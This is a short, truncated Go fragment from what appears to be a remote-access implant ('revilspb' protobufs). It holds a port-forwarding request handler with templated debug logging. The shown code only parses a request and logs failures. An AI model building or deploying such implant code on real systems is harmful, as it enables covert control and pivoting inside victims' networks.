...
func PortfwdReqHandler(envelope *revilspb.Envelope, connection *transports.Connection) {
	portfwdReq := &revilspb.PortfwdReq{}
	err := proto.Unmarshal(envelope.Data, portfwdReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Failed to unmarshal protobuf %s", err)
		// {{end}}
		portfwdResp, _ := proto.Marshal(&revilspb.Portfwd{
